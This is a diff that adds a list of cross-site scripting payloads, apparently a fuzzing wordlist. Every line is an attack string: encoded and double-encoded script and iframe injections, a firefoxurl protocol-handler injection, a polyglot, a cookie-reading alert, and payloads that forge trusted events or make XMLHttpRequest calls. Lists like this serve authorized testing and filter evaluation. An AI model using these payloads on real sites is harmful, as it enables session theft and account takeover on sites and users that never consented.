@@ -1,0 +1,17 @@
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+%22%3E%3Ciframe%20src=%22data:data:javascript:,%25%203%20c%20script%20%25%203%20e%20confirm(1)%20%25%203%20c/script%20%253%20e%22%3E
+%22%3E%3Cscript%20~~~%3Ealert(0%250)%3C/script%20~~~%3E
+%2522%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E
+%2525%2532%2532%2525%2533%2545%2525%2533%2543%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545%2525%2534%2542%2525%2534%2533%2525%2534%2536%2525%2533%2543%2525%2532%2546%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545
+%2527%253E%253C%2573%2563%2572%2569%2570%2574%253E%254B%2543%2546%253C%252F%2573%2563%2572%2569%2570%2574%253E
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+%253cimg%20onerror=alert(1)%20src=a%253e
+%253cscript%253ealert(1)%253c/script%253e
+%253cscript%253ealert(document.cookie)%253c/script%253e
+%3Ciframe%20src=%22data:data:javascript:,%25%203%20c%20script%20%25%203%20e%20confirm(1)%20%25%203%20c/script%20%253%20e%22%3E
+%3Cscript%20~~~%3Ealert(0%250)%3C/script%20~~~%3E
+'%3E%3Ciframe%20src=%22data:data:javascript:,%25%203%20c%20script%20%25%203%20e%20confirm(1)%20%25%203%20c/script%20%253%20e%22%3E
+'%3E%3Cscript%20~~~%3Ealert(0%250)%3C/script%20~~~%3E
+<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
+<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
+jaVasCript:/-/%60/%5C%60/'/%22//(/%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E
